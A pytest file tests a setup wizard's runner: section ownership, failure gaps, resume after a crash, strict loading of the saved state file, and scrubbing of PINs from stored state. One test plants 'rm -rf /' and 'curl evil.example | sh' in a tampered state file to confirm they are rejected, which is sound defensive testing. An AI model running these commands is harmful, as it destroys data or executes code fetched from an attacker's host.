"""The runner: one writer per section, blocking, gaps, and resume.

These drive the real runner over the real twelve packages, with each package's
code replaced by a stub, so what is under test is the runner's rules rather
than the wizard steps (which have their own tests, and which this phase does
not change).

Run:
    pytest tests/test_wizard_runner.py
"""
from __future__ import annotations

import argparse
import json
import os
import types

import pytest

from puffpai.wizard import loader
from puffpai.wizard import runner as wizard_runner
from puffpai.wizard.runner import Runner, Step


@pytest.fixture
def cfg(tmp_path):
    return types.SimpleNamespace(CONFIG_DIR=str(tmp_path / "config"))


def _args(**kw):
    return argparse.Namespace(yes=True, **kw)


def _stub_modules(monkeypatch, parts: dict[str, dict]):
    """Replace every package's code with the given ``{skill: {part: fn}}``."""

    def fake_load_module(package):
        module = types.SimpleNamespace()
        for name, func in (parts.get(package.id) or {}).items():
            setattr(module, f"part_{name}", func)
        return module

    monkeypatch.setattr(loader, "load_module", fake_load_module)


def _runner(cfg, monkeypatch, parts, schedule):
    _stub_modules(monkeypatch, parts)
    return Runner(args=_args(), cfg=cfg, non_interactive=True, schedule=schedule)


# -- the schedule itself ------------------------------------------------------

def test_every_skill_in_the_fixed_order_has_at_least_one_entry():
    scheduled = {step.skill for step in wizard_runner.SCHEDULE if step.skill}
    assert scheduled == set(wizard_runner.SKILL_ORDER)


def test_entry_ids_are_unique_and_runner_entries_own_no_skill():
    entries = [step.entry for step in wizard_runner.SCHEDULE]
    assert len(entries) == len(set(entries))
    for step in wizard_runner.SCHEDULE:
        if step.entry.startswith("runner."):
            assert step.skill == ""


def test_the_spec_order_is_the_twelve_in_the_spec_order():
    # Plus Assemble, between Surfaces and Prove.
    assert wizard_runner.SKILL_ORDER == (
        "discover", "purpose", "brain", "sources", "tools", "integrate",
        "context", "crew", "secure", "surfaces", "assemble", "prove", "handoff")


# -- one writer per section ---------------------------------------------------

def test_a_package_may_only_write_the_section_it_declared(cfg, monkeypatch):
    def writes_someone_elses(ctx):
        return {"section": "brain", "data": {"model": "smuggled"}}

    schedule = (Step("purpose.name", "purpose", "name"),)
    run = _runner(cfg, monkeypatch, {"purpose": {"name": writes_someone_elses}},
                  schedule)
    run.run()

    assert run.sections.get("brain") is None
    assert run.sections.get("persona") is None
    assert run.log[0]["outcome"] == "refused"
    assert "owns the 'persona' section" in run.log[0]["refusal"]
    assert run.gaps and run.gaps[0]["skill"] == "purpose"


def test_a_result_with_no_section_named_lands_in_the_declared_one(cfg, monkeypatch):
    schedule = (Step("purpose.name", "purpose", "name"),)
    run = _runner(cfg, monkeypatch,
                  {"purpose": {"name": lambda ctx: {"data": {"bot_name": "Infinity"}}}},
                  schedule)
    run.run()
    assert run.sections["persona"] == {"bot_name": "Infinity"}
    assert run.log[0]["outcome"] == "done"


def test_a_package_cannot_read_a_section_it_did_not_declare(cfg, monkeypatch):
    def peeks(ctx):
        return {"data": {"stolen": ctx.read("posture")}}

    schedule = (Step("purpose.name", "purpose", "name"),)
    run = _runner(cfg, monkeypatch, {"purpose": {"name": peeks}}, schedule)
    run.sections["posture"] = {"vault": {"pin": "1234"}}
    run.run()
    assert run.log[0]["outcome"] == "failed"
    assert "without declaring it" in run.log[0]["refusal"]
    assert "stolen" not in run.sections.get("persona", {})


# -- blocking, failing, and gaps ---------------------------------------------

def test_a_failure_in_a_blocking_skill_stops_the_build(cfg, monkeypatch):
    def boom(ctx):
        raise RuntimeError("no model answered")

    ran: list[str] = []
    schedule = (Step("brain.choose", "brain", "choose"),
                Step("surfaces.choose", "surfaces", "choose"))
    run = _runner(cfg, monkeypatch,
                  {"brain": {"choose": boom},
                   "surfaces": {"choose": lambda ctx: ran.append("surfaces")}},
                  schedule)
    with pytest.raises(RuntimeError):
        run.run()
    assert ran == []


def test_a_failure_in_a_non_blocking_skill_continues_with_a_gap(cfg, monkeypatch):
    def boom(ctx):
        raise RuntimeError("the registry did not answer")

    schedule = (Step("sources.plan", "sources", "plan"),
                Step("surfaces.choose", "surfaces", "choose"))
    run = _runner(cfg, monkeypatch,
                  {"sources": {"plan": boom},
                   "surfaces": {"choose": lambda ctx: {"data": {"allowlist": []}}}},
                  schedule)
    run.run()

    assert run.log[0]["outcome"] == "failed"
    assert run.log[1]["outcome"] == "done"
    assert run.sections["surfaces"] == {"allowlist": []}
    gap = run.gaps[0]
    assert gap["skill"] == "sources"
    assert gap["fix"] == {"kind": "command", "id": "setup.rerun", "args": {}}
    assert gap["fix_command"] == "puffpai setup"
    # A.8: the gap is mirrored where the closing screen will look for it.
    assert run.sections["handoff"]["gaps"] == [gap]


def test_a_deliberate_refusal_is_not_swallowed_into_a_gap(cfg, monkeypatch):
    from puffpai.cli import SetupRefused

    def refuse(ctx):
        raise SetupRefused("No", "The owner said no.", [])

    schedule = (Step("sources.plan", "sources", "plan"),)
    run = _runner(cfg, monkeypatch, {"sources": {"plan": refuse}}, schedule)
    with pytest.raises(SetupRefused):
        run.run()
    assert run.gaps == []


def test_a_step_whose_input_never_arrived_is_skipped_not_guessed(cfg, monkeypatch):
    schedule = (Step("brain.ready", "brain", "ready", ("ollama_url",)),)
    run = _runner(cfg, monkeypatch,
                  {"brain": {"ready": lambda ctx: pytest.fail("should not run")}},
                  schedule)
    run.run()
    assert run.log[0]["outcome"] == "skipped"
    assert run.gaps[0]["skill"] == "brain"


def test_a_not_built_skill_records_its_status_and_asks_nothing(cfg, monkeypatch,
                                                               capsys):
    schedule = (Step("prove.check", "prove", "check"),)
    run = _runner(cfg, monkeypatch,
                  {"prove": {"check": lambda ctx: {"status": "not_built",
                                                   "note": "not built yet"}}},
                  schedule)
    run.run()
    assert run.log[0]["outcome"] == "not_built"
    assert run.skill_status()["prove"]["outcome"] == "not_built"
    assert capsys.readouterr().out == ""


# -- the run log --------------------------------------------------------------

def test_the_log_names_every_skill_in_the_spec_order(cfg, monkeypatch):
    schedule = (Step("surfaces.choose", "surfaces", "choose"),)
    run = _runner(cfg, monkeypatch,
                  {"surfaces": {"choose": lambda ctx: {"data": {"a": 1}}}},
                  schedule)
    run.run()
    status = run.skill_status()
    assert list(status) == list(wizard_runner.SKILL_ORDER)
    assert status["surfaces"]["outcome"] == "done"
    assert status["surfaces"]["writes"] == "surfaces"
    assert status["surfaces"]["version"] == "1.0.0"
    assert status["prove"]["outcome"] == "not_run"
    row = run.log[0]
    assert row["started_at"] <= row["finished_at"]


# -- resume -------------------------------------------------------------------

def _resume_parts(ran: list[str], kill_at: str = ""):
    def make(name):
        def part(ctx):
            ran.append(name)
            if name == kill_at:
                raise SystemExit(f"killed during {name}")
            return {"data": {name: True}, "shared": {name: True}}
        return part
    return make


def test_a_killed_wizard_continues_from_the_next_unfinished_skill(cfg, monkeypatch):
    schedule = (Step("discover.census", "discover", "census"),
                Step("purpose.name", "purpose", "name"),
                Step("crew.size", "crew", "size"),
                Step("surfaces.choose", "surfaces", "choose"))

    first: list[str] = []
    make = _resume_parts(first, kill_at="size")
    parts = {"discover": {"census": make("census")},
             "purpose": {"name": make("name")},
             "crew": {"size": make("size")},
             "surfaces": {"choose": make("choose")}}
    run = _runner(cfg, monkeypatch, parts, schedule)
    with pytest.raises(SystemExit):
        run.run()
    assert first == ["census", "name", "size"]
    state_path = run.state_path()
    assert os.path.exists(state_path)

    second: list[str] = []
    make2 = _resume_parts(second)
    parts2 = {"discover": {"census": make2("census")},
              "purpose": {"name": make2("name")},
              "crew": {"size": make2("size")},
              "surfaces": {"choose": make2("choose")}}
    resumed = _runner(cfg, monkeypatch, parts2, schedule)
    assert resumed.load_state() is True
    assert resumed.next_entry() == "crew.size"
    resumed.run()

    # The two finished steps are not asked again; the killed one and the rest are.
    assert second == ["size", "choose"]
    assert resumed.sections["machine"] == {"census": True}
    assert resumed.sections["persona"] == {"name": True}
    assert resumed.sections["crew"] == {"size": True}
    assert resumed.sections["surfaces"] == {"choose": True}


def test_the_state_is_written_after_every_entry(cfg, monkeypatch):
    seen: list[list[str]] = []

    def part(ctx):
        with open(os.path.join(cfg.CONFIG_DIR, "wizard_run.json"),
                  encoding="utf-8") as handle:
            seen.append(sorted(json.load(handle)["entries"]))
        return None

    schedule = (Step("discover.census", "discover", "census"),
                Step("purpose.name", "purpose", "name"),
                Step("crew.size", "crew", "size"))
    run = _runner(cfg, monkeypatch,
                  {"discover": {"census": lambda ctx: None},
                   "purpose": {"name": part}, "crew": {"size": part}}, schedule)
    run.run()
    assert seen == [["discover.census"], ["discover.census", "purpose.name"]]


def test_no_pin_or_recovery_code_reaches_the_run_state(cfg, monkeypatch):
    def vault(ctx):
        return {"data": {"vault": {"sealed": True, "pin": "Telescope7x",
                                   "recovery_code": "ABCD-EFGH",
                                   "vault_pin_hash": "deadbeef"}}}

    schedule = (Step("secure.vault", "secure", "vault"),)
    run = _runner(cfg, monkeypatch, {"secure": {"vault": vault}}, schedule)
    run.run()

    raw = open(run.state_path(), encoding="utf-8").read()
    assert "Telescope7x" not in raw
    assert "ABCD-EFGH" not in raw
    assert "deadbeef" not in raw
    assert json.loads(raw)["sections"]["posture"]["vault"] == {"sealed": True}
    # The live section still carries what the manifest writer needs; only the
    # stored record is scrubbed.
    assert run.sections["posture"]["vault"]["pin"] == "Telescope7x"


def test_an_unreadable_state_file_is_not_a_resume(cfg, monkeypatch):
    run = _runner(cfg, monkeypatch, {}, ())
    os.makedirs(cfg.CONFIG_DIR, exist_ok=True)
    with open(run.state_path(), "w", encoding="utf-8") as handle:
        handle.write("{not json")
    assert run.load_state() is False


# -- the state file is read as untrusted data ---------------------------------

def _write_state(cfg, payload) -> str:
    os.makedirs(cfg.CONFIG_DIR, exist_ok=True)
    path = os.path.join(cfg.CONFIG_DIR, "wizard_run.json")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle)
    return path


def _base_state(**changes) -> dict:
    state = {"schema": "wizard_run/v1", "started_at": 1.0, "entries": {},
             "log": [], "gaps": [], "sections": {}, "shared": {}}
    state.update(changes)
    return state


@pytest.mark.parametrize("payload", [
    _base_state(started_at="abc"),
    _base_state(started_at=None),
    _base_state(started_at=True),
    _base_state(entries="nope"),
    _base_state(entries=[["a", "b", "c"]]),
    _base_state(log="not a log"),
    _base_state(log={"a": 1}),
    _base_state(gaps="nope"),
    _base_state(gaps={"a": 1}),
    _base_state(shared=[1, 2]),
    _base_state(shared="zzz"),
    _base_state(sections=[1, 2]),
    _base_state(sections="zzz"),
    _base_state(entries={str(i): {"outcome": "done"} for i in range(501)}),
    _base_state(shared={str(i): i for i in range(201)}),
    {"schema": "wizard_run/v2", "started_at": 1.0},
    ["not", "an", "object"],
    "a string",
])
def test_a_malformed_run_record_is_refused_rather_than_half_read(cfg, monkeypatch,
                                                                 payload):
    run = _runner(cfg, monkeypatch, {}, ())
    _write_state(cfg, payload)
    assert run.load_state() is False
    assert run.entries == {} and run.shared == {} and run.sections == {}


def test_a_state_file_larger_than_a_run_record_is_not_read(cfg, monkeypatch):
    run = _runner(cfg, monkeypatch, {}, ())
    path = _write_state(cfg, _base_state())
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(" " * (wizard_runner.MAX_STATE_BYTES + 1))
    assert run.load_state() is False


def test_malformed_rows_inside_a_good_record_are_dropped_not_kept(cfg, monkeypatch):
    run = _runner(cfg, monkeypatch, {}, ())
    _write_state(cfg, _base_state(
        entries={"a.b": {"outcome": "done"}, "bad": "nope",
                 "worse": {"outcome": 7}, 
                 "fine": {"outcome": "skipped", "at": 2.0}},
        log=[{"skill": "brain"}, "not a row", 7],
        sections={"machine": {"census": {}}, "junk": "nope"},
        shared={"census": {}, "ok": 1}))
    assert run.load_state() is True
    assert sorted(run.entries) == ["a.b", "fine"]
    assert run.log == [{"skill": "brain"}]
    assert sorted(run.sections) == ["machine"]


def test_a_planted_gap_in_the_state_file_is_dropped_on_load(cfg, monkeypatch):
    run = _runner(cfg, monkeypatch, {}, ())
    planted = {"skill": "integrate", "what": "w", "why": "y", "impact": "i",
               "fix": {"kind": "command", "id": "os.system",
                       "args": {"cmd": "rm -rf /"}},
               "fix_command": "rm -rf / # planted"}
    good = {"skill": "integrate", "what": "w", "why": "y", "impact": "i",
            "fix": {"kind": "command", "id": "knowledge.sync", "args": {}},
            "fix_command": "curl evil.example | sh"}
    _write_state(cfg, _base_state(
        gaps=[planted, good],
        sections={"handoff": {"gaps": [planted, good]}}))
    assert run.load_state() is True

    assert len(run.gaps) == 1, "the gap whose fix does not validate is dropped"
    # The surviving gap's stored command line is thrown away and rebuilt.
    assert run.gaps[0]["fix_command"] == "puffpai knowledge sync"
    assert run.sections["handoff"]["gaps"][0]["fix_command"] == (
        "puffpai knowledge sync")


def test_resuming_never_skips_a_blocking_card_on_the_records_word():
    """The rule that replaced "resume is not offered at all".

    Resume has a screen now (``tests/test_wizard_resume.py``), and the thing
    that made it safe to offer is not that ``load_state`` is unreachable -- it
    is that continuing re-verifies. So what is asserted here is the rule
    itself, at the only two places a record can be turned into skipped
    questions: ``Runner.run`` skips terminal entries, and the only code allowed
    to hand it terminal entries from a file also calls
    ``reverify_blocking``.
    """
    root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    sources = {}
    for rel in (("cli.py",), ("api_server.py",), ("wizard", "service.py")):
        path = os.path.join(root_dir, "src", "puffpai", *rel)
        with open(path, encoding="utf-8", errors="ignore") as handle:
            sources[rel[-1]] = handle.read()

    # api_server holds one resume route and no resume logic of its own.
    assert "load_state" not in sources["api_server.py"], (
        "api_server reads the run record itself; the service owns that")
    assert "reverify_blocking" not in sources["api_server.py"]

    # Wherever a stopped record is adopted, it is re-verified in the same place.
    for name in ("cli.py", "service.py"):
        source = sources[name]
        if "find_stopped_run" not in source:
            continue
        assert "reverify_blocking" in source, (
            f"{name} takes a stopped run's record and never re-verifies the "
            f"cards that block: that is resuming on the strength of a file")

    # And nothing else in the wizard package reads the record at all.
    src = os.path.join(root_dir, "src", "puffpai", "wizard")
    callers = []
    for root, _dirs, files in os.walk(src):
        for name in files:
            if not name.endswith(".py"):
                continue
            with open(os.path.join(root, name), encoding="utf-8",
                      errors="ignore") as handle:
                if "load_state" in handle.read():
                    callers.append(name)
    assert sorted(callers) == ["runner.py", "service.py"], (
        "load_state is read somewhere new; the resume rule lives in the runner")


# -- the value-level scrub ----------------------------------------------------

def test_a_secret_the_runner_holds_is_dropped_whatever_it_is_called(cfg,
                                                                    monkeypatch):
    def part(ctx):
        return {"data": {"vault": {"note": "the PIN is Telescope7x",
                                   "sealed": True}}}

    schedule = (Step("secure.vault", "secure", "vault"),)
    _stub_modules(monkeypatch, {"secure": {"vault": part}})
    run = Runner(args=argparse.Namespace(yes=True, vault_pin="Telescope7x"),
                 cfg=cfg, non_interactive=True, schedule=schedule)
    run.run()

    raw = open(run.state_path(), encoding="utf-8").read()
    assert "Telescope7x" not in raw
    assert json.loads(raw)["sections"]["posture"]["vault"]["sealed"] is True


def test_the_value_scrub_leaves_short_values_alone(cfg, monkeypatch):
    run = Runner(args=argparse.Namespace(yes=True, vault_pin="abc"), cfg=cfg,
                 non_interactive=True, schedule=())
    assert run.redactions() == ()
    assert wizard_runner.json_safe({"a": "abc"}, redact=()) == {"a": "abc"}


# -- one missing thing, said once ------------------------------------------------

def test_two_steps_naming_one_unsearchable_book_make_one_gap(cfg):
    """Any-bot check: the closing screen listed a downloaded book that is not
    searchable yet twice, once from Integrate and once from Prove."""
    from puffpai.wizard import fixes
    run = Runner(args=_args(), cfg=cfg, non_interactive=True, schedule=())
    sync = {"kind": "command", "id": "knowledge.sync", "args": {}}
    for skill in ("integrate", "prove"):
        run.record_gap(fixes.gap(skill=skill, what="Some Book is downloaded but not "
                                 "searchable yet.", why="Downloaded and waiting.",
                                 impact="", fix=sync))
    run.record_gap(fixes.gap(skill="prove", what="Other Book is downloaded but not "
                             "searchable yet.", why="", impact="", fix=sync))
    assert [g["what"] for g in run.gaps] == [
        "Some Book is downloaded but not searchable yet.",
        "Other Book is downloaded but not searchable yet."]
